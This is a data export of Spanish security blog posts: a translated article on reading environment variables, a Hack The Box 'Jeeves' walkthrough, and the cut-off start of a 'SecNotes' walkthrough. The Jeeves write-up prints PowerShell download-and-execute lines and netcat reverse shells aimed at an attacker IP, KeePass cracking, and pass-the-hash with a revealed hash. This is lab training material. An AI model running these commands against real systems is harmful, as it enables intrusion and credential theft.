[{"content":"Antes de empezar El presente art√≠culo no es de mi autor√≠a si no de Pantelis Roditis (proditis@echothrust.com), esto es solamente una traducci√≥n realizada con el permiso del autor. El art√≠culo original en ingl√©s lo puedes encontrar en el siguiente enlace: Environment variables and how to get them - Pantelis Roditis.\nMe pareci√≥ buena idea traducirlo dado que gracias a su lectura me permiti√≥ encontrar las banderas de entorno de la plataforma echoCTF.RED, adem√°s de aprender m√°s acerca del comportamiento de las variables de entorno.\nIntroducci√≥n  Una variable de entorno es un valor nombrado que puede ser accedido y puede afectar el comportamiento de un proceso ejecutado en una computadora.\n wikipedia   Piensa en las variables como nombres simb√≥licos que damos a los valores para evitar recordarlos. Imagina que usas el n√∫mero 3.1415926535897932384626433 constantemente, a menos que seas una especie de robot, va a ser dif√≠cil recordarlo. Entonces, le asignas un nombre al valor pi=3.1415926535897932384626433 y ahora cada vez que quieras usar el valor simplemente usas el nombre simb√≥lico pi, en vez de la secuencia gigante de n√∫meros.\nEn este documento, se describir√° el uso de variables de entorno, c√≥mo se puede acceder a ellas, manipularlas y aprovecharlas para ingenieros de seguridad tanto ofensivos como defensivos.\nPorque nos importa Entonces, ¬øpor qu√© son importantes las variables de entorno desde la perspectiva de seguridad?\nSol√≠a ‚Äã‚Äã‚Äã‚Äãser (en los viejos tiempos lol) que las variables de entorno eran visibles para todos y, como regla, la mayor√≠a de los desarrolladores no las usaban para almacenar informaci√≥n confidencial. Sin embargo, a medida que crec√≠a la adopci√≥n de variables de entorno, tambi√©n aumentaba la necesidad de comenzar a almacenar informaci√≥n un poco m√°s confidencial. Por lo tanto, se agreg√≥ la capacidad de ocultar las variables de entorno de otros usuarios y procesos a algunos, si no a todos, los sistemas UNIX y similares a UNIX (como Linux) y, por lo tanto, se limit√≥ su superficie de ataque.\nAhora, nos hemos mudado a la era de los contenedores y las variables de entorno tienen un nuevo significado. Echa un vistazo r√°pido a Docker Hub y ver√°s millones de im√°genes que usan variables de entorno que contienen informaci√≥n confidencial. Desde nombre de usuario, contrase√±as, claves de cifrado, tokens de autenticaci√≥n, claves del sistema, hay una imagen con un uso de variable de entorno para adaptarse a cualquier imaginaci√≥n\u0026hellip;\nComo ingeniero de seguridad ofensivo o defensivo, saber c√≥mo encontrar lo que est√° expuesto y poder acceder a esta informaci√≥n es una habilidad casi necesaria.\nY no nos enga√±emos, esta es definitivamente una habilidad que apreciar√°s mientras juegas en nuestra plataforma en l√≠nea echoCTF.RED, ya que las variables de entorno parecen m√°s dif√≠ciles de obtener que el acceso del usuario root\u0026hellip;\nComo funcionan Usaremos una variedad de sistemas para examinar c√≥mo se comportan las variables de entorno. Cuando no se menciona un sistema o shell, se puede asumir con seguridad que se trata de bash.\nComencemos definiendo y usando algunas variables:\n$ myint=1 $ mystring=\u0026#34;This is a long string\u0026#34; $ echo $myint 1 $ echo $mystring This is a long string Si desde la misma terminal vuelves a ejecutar bash notar√°s que las variables han desaparecido.\n$ echo $mystring This is a long string $ bash $ echo $mystring $ Lo mismo suceder√° si abres otra terminal e intentas acceder a la variable. Entonces, ¬øpor qu√© pasa eso?\nLas variables tienen efecto solo en la sesi√≥n actual. Para que una variable est√© disponible en los comandos y sesiones subsecuentes que se generan a partir de uno existente, tenemos que \u0026ldquo;exportarlos\u0026rdquo; (usando export en la terminal).\n$ export mystring $ bash $ echo $mystring This is a long string Muchos comandos y la mayor√≠a de las shells usan archivos de configuraci√≥n cuando se inician (por ejemplo, ~/.bashrc) para instruirles sobre la configuraci√≥n de variables. Adem√°s, algunos comandos establecen sus propias variables para ayudar a los comandos subsecuentes (por ejemplo, USER establecido por el inicio de sesi√≥n, etc.).\nVariables Docker Comprender el concepto de visibilidad de variables es especialmente importante en situaciones en las que las variables de entorno se configuran desde el inicio del sistema (como los contenedores docker), lo que, en determinadas condiciones, hace que se exporten al espacio de proceso global.\nNo profundizaremos en los detalles espec√≠ficos de docker, s√≥lo en la medida en que sea necesario para comprender las variables.\nVeamos un ejemplo con variables docker:\n$ docker run -it -e \u0026#34;myvar=myvalue\u0026#34; bash root@envlab: / # echo $myvar myvalue root@envlab: / #  Una cosa que notamos es que esta variable se exporta:\nroot@envlab: / # bash  root@envlab: / # echo $myvar myvalue Incluso si comenzamos un inicio de sesi√≥n bash, la variable todav√≠a est√° all√≠:\nroot@envlab: / # bash -l 4df007c4e761:/# echo $myvar myvalue 4df007c4e761:/# Incluso si cambiamos de usuario y shell, la variable se encuentra ah√≠:\n4df007c4e761:/# su -s /bin/sh bin 4df007c4e761:/$ id uid=1(bin) gid=1(bin) groups=1(bin),1(bin),2(daemon),3(sys) 4df007c4e761:/$ echo $myvar myvalue Sin embargo, como podemos entender, esto podr√≠a tener algunos efectos secundarios muy peligrosos, por esta raz√≥n, muchos demonios que se ejecutan en el sistema eligen borrar el entorno para procesos posteriores (por ejemplo, php-fpm que tiene clear_env = yes por defecto). Esta es la raz√≥n por la que no se puede acceder a ETSCTF_FLAG cuando se obtiene shell como www-data.\nComo obtenerlas Entonces, vayamos a la parte jugosa sobre c√≥mo encontrar y mostrar los valores de estas variables.\nprintenv - imprime todo o parte del entorno El comando printenv se puede usar para ver las variables actuales definidas en el entorno.\nroot@envlab: / # printenv HOSTNAME=envlab PWD=/ HOME=/root _BASH_VERSION=5.1.8 _BASH_BASELINE=5.1 _BASH_LATEST_PATCH=8 TERM=xterm SHLVL=1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin _=/bin/printenv root@envlab: / #  env - imprime el entorno o ejecuta un programa con un entorno modificado Los comandos env y printenv se comportan exactamente igual cuando se usan sin par√°metros. Sin embargo, env tambi√©n se puede usar para ejecutar un comando con un entorno modificado.\n Imprimir le ambiente actual.  root@envlab: / # env HOSTNAME=envlab PWD=/ HOME=/root _BASH_VERSION=5.1.8 _BASH_BASELINE=5.1 _BASH_LATEST_PATCH=8 TERM=xterm SHLVL=1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin _=/usr/bin/env root@envlab: / # Reiniciar el entorno y ejecutar /usr/bin/env para imprimir el entorno y ver que est√° vac√≠o.  root@envlab: / # env -i /usr/bin/env  root@envlab: / #  Reiniciar el entorno y ejecutar /usr/local/bin/bash. Lo que obtenemos son las variables que bash define por defecto.  root@envlab: / # env -i /usr/local/bin/bash root@envlab: / # env PWD=/ SHLVL=1 _=/usr/bin/env root@envlab: / #  Ejecutar bash con la variable $HOME modificada.  root@envlab: / # env -i HOME=/home /usr/local/bin/bash root@envlab: / # echo $HOME /home root@envlab: / # env PWD=/ HOME=/home SHLVL=1 _=/usr/bin/env set BUILTIN - muestra o establece variables y funciones de shell Sin opciones, el nombre y el valor de cada variable se muestran en un formato que se puede reutilizar como entrada para configurar o restablecer las variables configuradas actualmente. Las variables de solo lectura no se pueden restablecer.\nWithout options, the name and value of each shell variable are displayed in a format that can be reused as input for setting or resetting the currently-set variables. Read-only variables cannot be reset.\nEste es un comando incorporado que se usa para definir y/o imprimir variables y funciones espec√≠ficas de la shell.\nEjecutando solo set, devuelve muchas m√°s variables que antes.\nroot@envlab: / # set BASH=/usr/local/bin/bash BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:globasciiranges:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath BASH_ALIASES=() BASH_ARGC=([0]=\u0026#34;0\u0026#34;) BASH_ARGV=() BASH_CMDS=() BASH_LINENO=() BASH_SOURCE=() BASH_VERSINFO=([0]=\u0026#34;5\u0026#34; [1]=\u0026#34;1\u0026#34; [2]=\u0026#34;8\u0026#34; [3]=\u0026#34;1\u0026#34; [4]=\u0026#34;release\u0026#34; [5]=\u0026#34;x86_64-pc-linux-musl\u0026#34;) BASH_VERSION=\u0026#39;5.1.8(1)-release\u0026#39; COLUMNS=211 DIRSTACK=() EUID=0 GROUPS=() HISTFILE=/root/.bash_history HISTFILESIZE=500 HISTSIZE=500 HOME=/root HOSTNAME=envlab HOSTTYPE=x86_64 IFS=$\u0026#39; \\t\\n\u0026#39; LINES=55 MACHTYPE=x86_64-pc-linux-musl MAILCHECK=60 OPTERR=1 OPTIND=1 OSTYPE=linux-musl PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PPID=0 PS1=\u0026#39;\\s-\\v\\$ \u0026#39; PS2=\u0026#39;\u0026gt; \u0026#39; PS4=\u0026#39;+ \u0026#39; PWD=/ SHELL=/bin/ash SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor SHLVL=1 TERM=xterm UID=0 _=bash _BASH_BASELINE=5.1 _BASH_LATEST_PATCH=8 _BASH_VERSION=5.1.8 Estas son variables que est√°n definidas por nuestra instancia de la shell actual y, a menos que se modifiquen de otra manera, no ser√°n heredadas por los procesos secundarios. Por ejemplo, podemos ver que las variables relacionadas con BASH_ no est√°n configuradas en la invocaci√≥n de la siguiente shell (ash en el siguiente ejemplo).\nroot@envlab: / # /bin/ash / # set HISTFILE=\u0026#39;/root/.ash_history\u0026#39; HOME=\u0026#39;/root\u0026#39; HOSTNAME=\u0026#39;envlab\u0026#39; IFS=\u0026#39; \u0026#39; LINENO=\u0026#39;\u0026#39; OPTIND=\u0026#39;1\u0026#39; PATH=\u0026#39;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#39; PPID=\u0026#39;1\u0026#39; PS1=\u0026#39;\\w \\$ \u0026#39; PS2=\u0026#39;\u0026gt; \u0026#39; PS4=\u0026#39;+ \u0026#39; PWD=\u0026#39;/\u0026#39; SHLVL=\u0026#39;2\u0026#39; TERM=\u0026#39;xterm\u0026#39; _=\u0026#39;/bin/sh\u0026#39; _BASH_BASELINE=\u0026#39;5.1\u0026#39; _BASH_LATEST_PATCH=\u0026#39;8\u0026#39; _BASH_VERSION=\u0026#39;5.1.8\u0026#39; / #  Una ventaja adicional de usar set es que tambi√©n muestra funciones que pueden haber sido definidas.\nroot@envlab: / # function mytest() { ls; } root@envlab: / # set|tail TERM=xterm UID=0 _=set _BASH_BASELINE=5.1 _BASH_LATEST_PATCH=8 _BASH_VERSION=5.1.8 mytest () { ls } root@envlab: / # mytest bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var declare / typeset BUILTINS - declarar variables y/o darles atributos Declarar variables y/o darles atributos. Si no se dan nombres, se muestran los valores de las variables. Este comando tiene la capacidad de mostrar y manipular variables, as√≠ como sus atributos (por ejemplo, int, array, exported, etc.).\nSin argumentos, funciona como set, mostrando las variables y funciones de la shell y del entorno.\nenvlab:/# declare BASH=/usr/local/bin/bash BASH_ALIASES=() BASH_ARGC=([0]=\u0026#34;0\u0026#34;) BASH_ARGV=() BASH_CMDS=() BASH_LINENO=() BASH_SOURCE=() . . . Sin embargo, si ejecutamos declare -p tambi√©n podemos ver sus atributos.\nenvlab:/# declare -p declare -- BASH=\u0026#34;/usr/local/bin/bash\u0026#34; declare -i BASHPID declare -A BASH_ALIASES=() declare -a BASH_ARGC=([0]=\u0026#34;0\u0026#34;) declare -x PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34; declare -ir UID=\u0026#34;0\u0026#34; Lo siguiente es lo que significan los atributos de declare:\n -a Cada nombre es una variable indexada en un arreglo. -A Cada nombre es una variable de un arreglo asociativo. -f Usar solo nombres de funciones. -i La variable se trata como un entero. -l Cuando se asigna un valor a la variable, todos los caracteres en may√∫sculas se convierten en min√∫sculas. -n Da a cada nombre el atributo nameref, convirti√©ndolo en una referencia de nombre a otra variable. -r Hacer nombres de solo lectura. -t Dar a cada nombre el atributo de seguimiento. -u Cuando se asigna un valor a la variable, todos los caracteres en min√∫sculas se convierten en may√∫sculas. -x Marcar nombres para exportar a comandos subsecuentes a trav√©s del entorno.  Para obtener m√°s detalles sobre el comando declare, consulte las p√°ginas del manual bash(1) en la secci√≥n SHELL BUILTIN COMMANDS.\nEl comando typeset se comporta de manera muy similar a declare y est√° all√≠ principalmente para la compatibilidad con otros shells. Sin embargo, typeset sin opciones, devuelve todas las variables y funciones de la shell integradas.\nps Todos los comandos anteriores que vimos funcionan en la sesi√≥n de la shell actual, sin embargo, muchas veces nos gustar√≠a ver qu√© variables de entorno se definieron para una aplicaci√≥n que ya se est√° ejecutando, que puede que nosotros hayamos iniciado o no.\nEl comando ps puede ayudar con eso. Este comando proporciona informaci√≥n sobre los procesos en ejecuci√≥n en un sistema, como PID, nombre, tiempo de ejecuci√≥n, memoria utilizada, etc. Al agregar algunas opciones adicionales, podemos ver mucha m√°s informaci√≥n que solo estas. Las opciones que son de nuestro inter√©s, junto con sus significados se pueden encontrar a continuaci√≥n:\n a: Selecciona todos los procesos excepto los dos l√≠deres de sesi√≥n. e: Muestra el entorno despu√©s del comando. w: Amplia salida. Utilice esta opci√≥n dos veces para un ancho ilimitado. f: Jerarqu√≠a de procesos en arte ASCII (forest). u: Muestra formato orientado al usuario.  root@105b97a5ef81:/# ps -afeww UID PID PPID C STIME TTY TIME CMD root 1 0 0 08:48 pts/0 00:00:00 /bin/bash /entrypoint.sh bash root 17 1 0 08:48 pts/0 00:00:00 bash root 93 17 0 08:55 pts/0 00:00:00 ps -feww root@105b97a5ef81:/# ps -aufeww USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 17964 2900 pts/0 Ss 08:48 0:00 /bin/bash /entrypoint.sh bash PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=envlab TERM=xterm DEBIAN_FRONTEND=noninteractive HOME=/root root 17 0.0 0.0 18180 3348 pts/0 S 08:48 0:00 bash HOSTNAME=envlab PWD=/ HOME=/root DEBIAN_FRONTEND=noninteractive TERM=xterm SHLVL=1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin _=/bin/bash root 94 0.0 0.0 36632 2908 pts/0 R+ 08:55 0:00 \\_ ps -ufeww HOSTNAME=envlab PWD=/ HOME=/root DEBIAN_FRONTEND=noninteractive TERM=xterm SHLVL=2 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin _=/bin/ps Podemos ver en el resultado anterior que obtenemos las variables de entorno tal como existen para cada uno de los comandos en ejecuci√≥n. Sin embargo, hay algunas limitaciones. Si ejecutamos los mismos comandos que un usuario no root, podemos ver que no podemos ver el entorno de los procesos de otros usuarios.\ndatabus@63f7264d374e:/$ ps -aueww USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 17964 2992 pts/0 Ss 09:04 0:00 /bin/bash /entrypoint.sh bash root 18 0.0 0.0 18184 3280 pts/0 S 09:04 0:00 bash root 67 0.0 0.0 46844 2772 pts/0 S 09:09 0:00 su - databus databus 68 0.0 0.0 4276 708 pts/0 S 09:09 0:00 -su TERM=xterm PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games MAIL=/var/mail/databus HOME=/ SHELL=/bin/sh USER=databus LOGNAME=databus databus 71 0.0 0.0 18188 3292 pts/0 S 09:09 0:00 bash -l MAIL=/var/mail/databus USER=databus HOME=/ LOGNAME=databus TERM=xterm PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games SHELL=/bin/sh PWD=/ sampleu+ 152 0.8 0.0 18196 3056 pts/1 Ss+ 09:13 0:00 bash databus 160 0.0 0.0 36632 2888 pts/0 R+ 09:14 0:00 ps -aueww USER=databus PWD=/ HOME=/ MAIL=/var/mail/databus SHELL=/bin/sh TERM=xterm SHLVL=1 LOGNAME=databus PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games _=/bin/ps Como podemos ver, los tres primeros procesos pertenecientes a root y sampleuser (una l√≠nea antes de la √∫ltima) no tienen informaci√≥n de entorno incluida en la salida de ps.\n/proc Hay otra forma de obtener el entorno de un proceso en ejecuci√≥n y esto es a trav√©s de /proc, el pseudo-sistema de archivos de informaci√≥n del proceso.\nEl sistema de archivos proc es un pseudo-sistema de archivos que proporciona una interfaz para las estructuras de datos del n√∫cleo. Es com√∫nmente montado en /proc, autom√°ticamente por el sistema.\nEl sistema de archivos proporciona una consulta f√°cil para consultar y manipular las estructuras del kernel como si fueran archivos simples. Para cada proceso en el sistema, hay un directorio correspondiente en /proc/\u0026lt;pid\u0026gt;/ con la informaci√≥n del kernel exportado. Los archivos ubicados debajo de esa carpeta corresponden a diferentes tipos de informaci√≥n del kernel, pero los que nos interesan son environ y cmdline.\n/proc/[pid]/environ: Este archivo contiene el entorno inicial que se estableci√≥ cuando se inici√≥ el programa que se est√° ejecutando actualmente a trav√©s de execve(2). Las entradas est√°n separadas por bytes nulos (\\0), y puede haber un byte nulo en el fin. Por lo tanto, para imprimir el entorno del proceso 1, lo har√≠a.\nroot@63f7264d374e:/# strings /proc/1/environ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=envlab TERM=xterm DEBIAN_FRONTEND=noninteractive HOME=/root /proc/[pid]/cmdline: Este archivo de solo lectura contiene la l√≠nea de comando completa para el proceso, a menos que el proceso sea un zombi. En el √∫ltimo caso, no hay nada en este archivo: es decir, una lectura de este archivo devolver√° 0 caracteres. Los argumentos de la l√≠nea de comandos aparecen en este archivo como un conjunto de cadenas separadas por bytes nulos (\\0), con un byte nulo adicional despu√©s de la √∫ltima cadena.\nroot@63f7264d374e:/# strings /proc/1/cmdline /bin/bash /entrypoint.sh bash La raz√≥n por la que queremos examinar el environ es bastante clara, sin embargo, cmdline puede no serlo. La raz√≥n por la que examinamos ambos archivos es que el comando que se inici√≥ puede incluir variables de entorno en su l√≠nea de comandos.\nTen en cuenta que, dependiendo de la opci√≥n de montaje hidepid=n, el sistema de archivos /proc puede comportarse de manera diferente:\n 0: Todo el mundo puede acceder a todos los directorios /proc/[pid]. Este es el comportamiento tradicional y el predeterminado si no se especifica la opci√≥n de montaje. 1: Los usuarios no pueden acceder a archivos y subdirectorios dentro de ning√∫n directorio /proc/[pid] excepto el suyo propio (los directorios /proc/[pid] permanecen visibles). Los archivos confidenciales como /proc/[pid]/cmdline y /proc/[pid]/status ahora est√°n protegidos contra otros usuarios. Esto hace que sea imposible saber si alg√∫n usuario est√° ejecutando un programa espec√≠fico (siempre y cuando el programa no se revele por su comportamiento). 2: Como en el modo 1, pero adem√°s los directorios /proc/[pid] que pertenecen a otros usuarios se vuelven invisibles. Esto significa que las entradas /proc/[pid] ya no se pueden usar para descubrir los PID en el sistema. Esto no oculta el hecho de que existe un proceso con un valor PID espec√≠fico (se puede aprender por otros medios, por ejemplo, mediante kill -0 $PID), pero oculta el UID y el GID de un proceso, que de otro modo podr√≠an aprenderse empleando stat(2) en un directorio /proc/[pid]. Esto complica enormemente la tarea de un atacante de recopilar informaci√≥n sobre procesos en ejecuci√≥n (por ejemplo, descubrir si alg√∫n demonio se est√° ejecutando con privilegios elevados, si otro usuario est√° ejecutando alg√∫n programa confidencial, si otros usuarios est√°n ejecutando alg√∫n programa, etc.).  ¬øQu√© sigue? Espero que hayas disfrutado de la lectura y que hayas podido aprender algunos trucos adicionales para encontrar variables de entorno para tu sesi√≥n, as√≠ como para ejecutar procesos. Todo lo que tienes que hacer ahora es volver a echoCTF.RED y ver si puedes obtener las variables de entorno de esos objetivos que a√∫n no has terminado üòÇ.\nTen en cuenta que otros shells (ash, ksh, csh, etc.) pueden comportarse de manera diferente con respecto al entorno y las variables y funciones integradas. Los comandos descritos deben ser los mismos en la mayor√≠a, sin embargo, la salida puede diferir. Siempre es una buena idea consultar las p√°ginas del manual del shell respectivo con el que se est√° trabajando antes de probar cosas al azar.\nReferencias  https://docs.oracle.com/cd/E19683-01/817-6958/userconcept-26/index.html https://www.digitalocean.com/community/tutorials/how-to-read-and-set-environmental-and-shell-variables-on-linux https://www.cs.ait.ac.th/~on/O/oreilly/unix/upt/ch06_01.htm  ","permalink":"https://srrequiem.xyz/posts/env-vars/","summary":"Antes de empezar El presente art√≠culo no es de mi autor√≠a si no de Pantelis Roditis (proditis@echothrust.com), esto es solamente una traducci√≥n realizada con el permiso del autor. El art√≠culo original en ingl√©s lo puedes encontrar en el siguiente enlace: Environment variables and how to get them - Pantelis Roditis.\nMe pareci√≥ buena idea traducirlo dado que gracias a su lectura me permiti√≥ encontrar las banderas de entorno de la plataforma echoCTF.","title":"Variables de entorno y c√≥mo obtenerlas"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Jeeves   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 20:08 EDT Initiating Connect Scan at 20:08 Scanning 10.10.10.63 [65535 ports] Discovered open port 80/tcp on 10.10.10.63 Discovered open port 445/tcp on 10.10.10.63 Discovered open port 135/tcp on 10.10.10.63 Connect Scan Timing: About 26.73% done; ETC: 20:10 (0:01:25 remaining) Discovered open port 50000/tcp on 10.10.10.63 Completed Connect Scan at 20:10, 97.29s elapsed (65535 total ports) Nmap scan report for 10.10.10.63 Host is up, received user-set (0.069s latency). Scanned at 2022-06-22 20:08:29 EDT for 97s Not shown: 65531 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 80/tcp open http syn-ack 135/tcp open msrpc syn-ack 445/tcp open microsoft-ds syn-ack 50000/tcp open ibm-db2 syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 97.32 seconds Escaneo espec√≠fico ‚îî‚îÄ$ nmap -sCV -p 80,135,445,50000 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 21:30 EDT Nmap scan report for 10.10.10.63 Host is up (0.069s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Ask Jeeves |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 50000/tcp open http Jetty 9.4.z-SNAPSHOT |_http-title: Error 404 Not Found |_http-server-header: Jetty(9.4.z-SNAPSHOT) Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-06-23T06:30:29 |_ start_date: 2022-06-22T23:59:38 |_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.15 seconds Enumeraci√≥n Servicios http - 80 Se presenta en el sitio web un formulario con un input el cual al realizar el submit se redirige a error.html que presenta un imagen relacionada al tipo de error que arroja un IIS. Dado que est√° hardcodeada la redireccion no se intent√≥ nada al respecto.\nPor otro lado, tambi√©n se busc√≥ fuzzear directorios mediante ffuf, sin tener √©xito mostrando s√≥lo las rutas con las anteriormente se hab√≠a interactuado.\nhttp - 50000 Manual Se hace la omisi√≥n de los puertos en los cuales no se encontr√≥ informaci√≥n que pudiera resultar √∫til, sin embargo, en este puerto es mostrado un error gen√©rico del servidor Jetty exponiendo en primera instancia la versi√≥n que se est√° ejecutando. Despu√©s de buscar vulnerabilidades relacionadas e intentar explotarlas se decidi√≥ no darle seguimiento dado que en este punto se hab√≠a visualizado una ruta expuesta en la ejecuci√≥n de ffuf.\nffuf Despu√©s de casi completar el diccionario que por lo regular se usa, se identific√≥ la ruta askjeeves mediante:\nffuf -c -ic -u http://10.10.10.63:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.xml,.html Por lo que al navegar a esta se identific√≥ la disponibilidad de un servidor Jenkins, abriendo paso a posibles rutas de explotaci√≥n haciendo uso de las caracter√≠sticas ofrecidas por la plataforma.\nExplotaci√≥n RCE 1 Pasos previos | Preparaci√≥n Jenkins ofrece una consola de scripts siguiendo la sint√°xis de Groovy, disponible en Build Executor Status \u0026gt; master \u0026gt; Script Console.\nAl visualizar la sint√°xis necesaria para ejecutar comandos de consola expuesta en la misma secci√≥n, se prepar√≥ la reverse shell de nishang ejecutando al final del archivo la funci√≥n empleada para entablar una reverse shell:\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443 Ejecuci√≥n Se envi√≥ la invocaci√≥n al recurso expuesto mediante la consola de scripts:\nprint \u0026#34;powershell.exe IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://10.10.14.16/Invoke-PowerShellTcp.ps1\u0026#39;)\u0026#34;.execute().text Estableciendo as√≠ la reverse shell.\nRCE 2 Pasos previos | Preparaci√≥n Igualmente se pueden ejecutar comandos directamente en la m√°quina mediante la creaci√≥n de un nuevo item Create New Item \u0026gt; Freestyle Project \u0026gt; Build \u0026gt; Execute Windows batch command, guardando en el campo de texto el comando a ejecutar:\npowershell.exe IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://10.10.14.16/Invoke-PowerShellTcp.ps1\u0026#39;) Ejecuci√≥n Restando s√≥lo guardar el proceso en la plataforma y ejecutarlo (Save \u0026gt; Build Now). Teniendo de esta forma otra manera de ejecutar comandos a trav√©s de Jenkins.\nPost Explotaci√≥n Enumeraci√≥n Al ejecutar:\nwhoami /all Para observar los privilegios con los que cuenta el usuario, se visualiz√≥ disponible el privilegio SeImpersonatePrivilege habilitado lo que denota la ruta de escalaci√≥n haciendo uso de JuicyPotato.\nAdem√°s, se identific√≥ una base de datos de KeePass CEH.kdbx en el directorio Documents del usuario, abriendo otra ruta de escalaci√≥n si se llegara a encontrar informaci√≥n relevante para el proceso.\nEscalaci√≥n de privilegios kohsuke ‚Üí nt authority\\system JuicyPotato Al cargar previamente el binario de netcat y ejecutar el binario de JuicyPotato se obtuvo una reverse shell como nt authority\\system mediante:\n.\\jp.exe -t * -l 1337 -p cmd.exe -a \u0026#34; /c C:\\users\\kohsuke\\downloads\\nc.exe -e cmd.exe 10.10.14.16 1234\u0026#34;  Ejecuci√≥n de JuicyPotato. Otenci√≥n de reverse shell.  KeePass Se extrajo la base de datos de KeePass haciendo uso de la utiler√≠a de impacket, mediante:\nimpacket-smbserver smbFolder $(pwd) -smb2support` y realizando el copiado con `cp .\\CEH.kdbx \\\\10.10.14.16\\smbFolder Posteriormente, para crackear el archivo fue necesario primero extraer el hash del mismo, usando keepass2john CEH.kdbx \u0026gt; ceh.hash para a continuaci√≥n iniciar el proceso de cracking haciendo uso de:\njohn ceh.hash --wordlist=/usr/share/wordlists/rockyou.txt Obteniendo as√≠ la contrase√±a del archivo (moonshine1).\nLa base de datos expone m√∫ltiples entradas con contrase√±as disponibles aunque una en particular se realz√≥ por sobre todas debido al formato de la entrada. Identificandola como un hash NTLM aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00.\nPor lo que hizo uso de nuevo de impacket para conectar a la m√°quina proveyendo el hash. Dada la estructura de lo hashes NTLM se podr√≠a usar tanto como:\nimpacket-psexec \u0026#39;administrator@10.10.10.63\u0026#39; -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\u0026#39; Como con:\nimpacket-psexec \u0026#39;administrator@10.10.10.63\u0026#39; -hashes \u0026#39;:e0fb1fb85756c24235ff238cbe81fe00\u0026#39; Debido a que la primera mitad corresponde al identificador de la m√°quina y la segunda a la \u0026ldquo;autorizaci√≥n\u0026rdquo; del usuario.\nObtenci√≥n de bandera Despu√©s de buscar extraer el contenido de la bandera, se encontr√≥ el archivo hm.txt el cu√°l indica que la bandera no se encuentra presente si no en otro sitio. Durante ese proceso se encontr√≥ informaci√≥n referente a los Alternate Data Streams que b√°sicamente son una forma de ocultar informaci√≥n en un archivo y la caracter√≠stica existe √∫nicamente en sistemas de archivos de tipo NTFS.\nPor lo que haciendo uso de los comandos sugeridos en el art√≠culo se pudo visualizar que el stream oculto era root.txt con:\npowershell.exe get-item -path .\\hm.txt -stream * Para posteriormente extraer su contenido mediante:\npowershell.exe get-content -path .\\hm.txt -stream root.txt Referencias  CVE Details - Jetty. Github - Nishang. Github - JuicyPotato. Github - Impacket. Introduction to Alternate Data Streams.  ","permalink":"https://srrequiem.xyz/posts/htb-jeeves/","summary":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre Jeeves   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores mrb3n    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Jeeves"},{"content":"Estad√≠sticas    Caracter√≠stica Descripci√≥n     Nombre SecNotes   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores 0xdf    Reconocimiento Escaneo de host Escaneo completo de puertos ‚îî‚îÄ$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 12:56 EDT Initiating Connect Scan at 12:56 